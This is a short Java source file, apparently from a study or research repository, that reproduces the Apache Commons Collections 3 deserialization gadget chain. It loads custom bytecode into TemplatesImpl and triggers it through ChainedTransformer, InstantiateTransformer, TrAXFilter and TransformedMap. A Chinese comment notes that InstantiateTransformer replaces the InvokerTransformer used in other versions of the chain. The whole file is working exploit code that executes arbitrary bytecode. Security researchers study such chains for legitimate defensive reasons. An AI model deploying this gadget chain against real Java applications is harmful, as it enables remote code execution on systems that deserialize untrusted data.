import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.Transformer;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.functors.InstantiateTransformer;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

import javax.xml.transform.Templates;

import static util.common.setFieldValue;
import static util.loadClass.getBytesCode;

public class CommonsCollections3 {
    public static void main(String[] args) throws Exception {
        // source: bytecodes/HelloTemplateImpl.java
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {getBytesCode()});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
//                替换InvokerTransformer
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj})
//                new ConstantTransformer(obj),
//                new InvokerTransformer("newTransformer",null,null)
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "xxxx");

        new TrAXFilter(obj);
    }
}